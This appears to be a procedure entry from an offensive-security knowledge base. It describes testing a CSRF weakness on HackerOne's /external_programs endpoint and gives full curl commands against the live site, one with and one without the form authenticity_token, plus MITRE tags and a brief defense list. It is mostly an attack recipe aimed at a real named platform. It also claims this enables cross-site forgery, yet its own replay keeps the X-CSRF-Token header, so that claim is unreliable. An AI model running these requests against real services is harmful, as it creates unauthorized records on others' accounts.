---
id: proc-csrf-bypass-request-mod
tags:
  - csrf
  - bypass
  - web
  - request-modification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-original-external-program-post]]'
  - '[[commands/curl-modified-external-program-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:35.819Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Capture-and-Modify-External-Program-Creation-Request

## Summary

This procedure captures a legitimate HTTP POST request to HackerOne's /external_programs endpoint for creating external programs, then modifies it by removing the form authenticity_token while retaining the X-CSRF-Token header. This demonstrates a CSRF protection weakness allowing the request to succeed without the form token, potentially enabling forged requests from malicious sites to create unauthorized programs on behalf of authenticated users.

## Description

The target endpoint is POST /external_programs on hackerone.com, which uses multipart/form-data for submission including program details like name, handle, policy, and CSRF tokens. The vulnerability stems from the Ruby on Rails application validating CSRF via either the form field or header, creating a bypass opportunity. Prerequisites include an authenticated session; the procedure uses a proxy tool to intercept and replay requests. Expected outcome is successful program creation without the form token, confirming low-severity CSRF risk that could chain with other exploits like XSS.

## Requirements

1. Authenticated HackerOne session with cookie (__Host-session, etc.) and valid X-CSRF-Token.
2. Proxy tool like Burp Suite configured to intercept browser traffic.
3. Access to https://hackerone.com/directory/new for form submission.
4. Basic knowledge of HTTP multipart/form-data structure.

## Defense

Defensive measures and detection strategies:

- Enforce strict CSRF validation requiring both header and form tokens, or prefer form tokens for non-AJAX requests.
- Implement same-site cookie attributes (Lax/Strict) to mitigate CSRF.
- Monitor for anomalous program creation requests lacking form tokens via WAF logs.
- Rate-limit endpoint to prevent abuse.

## Objectives

1. Demonstrate CSRF bypass by omitting form token.
2. Create unauthorized external program to assess impact.
3. Highlight defense-in-depth need for chained exploit prevention.

## Instructions

### Step 1: Capture Original Request

**Context**: Intercept the legitimate POST to obtain tokens and form structure.

**Command** ([[commands/curl-original-external-program-post]]):

Use Burp Suite to proxy and capture, or simulate with curl:

```bash
curl -X POST https://hackerone.com/external_programs \
  -H "X-CSRF-Token: QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==" \
  -H "Cookie: __Host-session=..." \
  -F "authenticity_token=QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==" \
  -F "name=test" \
  -F "handle=edmodotest" \
  -F "about=" \
  -F "website=edmodo.com" \
  -F "twitter_handle=" \
  -F "policy=Exclusions\n\nWhile researching, we'd like to ask you to refrain from:\n\n Denial of service\n Spamming\n Social engineering (including phishing) of edmodo staff or contractors\n Any physical attempts against edmodo property or data centers\n" \
  -F "policy_url=" \
  -F "scopes[]=" \
  -F "scopes[]=" \
  -F "offers_rewards=true" \
  -F "thanks_url=" \
  -F "disclosure_url=" \
  -F "disclosure_method=email" \
  -F "disclosure_email=policy@edmodo.com" \
  -F "profile_picture=@/dev/null" \
  -F "_ignore="
```

> This sends the full request with both tokens; capture via proxy for exact headers/cookies. Expected: 200 OK if submitting form.

### Step 2: Modify and Send Request

**Context**: Remove form token to test bypass.

**Command** ([[commands/curl-modified-external-program-post]]):

```bash
curl -X POST https://hackerone.com/external_programs \
  -H "X-CSRF-Token: QPxj69iMMHCtU+KrbEgKN4V2FvpgMfLSNdxMqAHlGiYc67nzsqEof33U+7Ot4b0tlyER++xPuvlP8SsyzvHg8Q==" \
  -H "Cookie: __Host-session=..." \
  -F "name=test" \
  -F "handle=edmodotest" \
  -F "about=" \
  -F "website=edmodo.com" \
  -F "twitter_handle=" \
  -F "policy=Exclusions\n\nWhile researching, we'd like to ask you to refrain from:\n\n Denial of service\n Spamming\n Social engineering (including phishing) of edmodo staff or contractors\n Any physical attempts against edmodo property or data centers\n" \
  -F "policy_url=" \
  -F "scopes[]=" \
  -F "scopes[]=" \
  -F "offers_rewards=true" \
  -F "thanks_url=" \
  -F "disclosure_url=" \
  -F "disclosure_method=email" \
  -F "disclosure_email=policy@edmodo.com" \
  -F "profile_picture=@/dev/null" \
  -F "_ignore="
```

> Omits -F "authenticity_token=..."; adjust Content-Length if manual. Expected: 200 OK with {"handle":"edmodotest"}.

### Step 3: Verify Response

**Context**: Confirm bypass success.

Inspect response for JSON handle; success if program created without form token.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-original-external-program-post]]
- [[commands/curl-modified-external-program-post]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- csrf
- web
- bypass
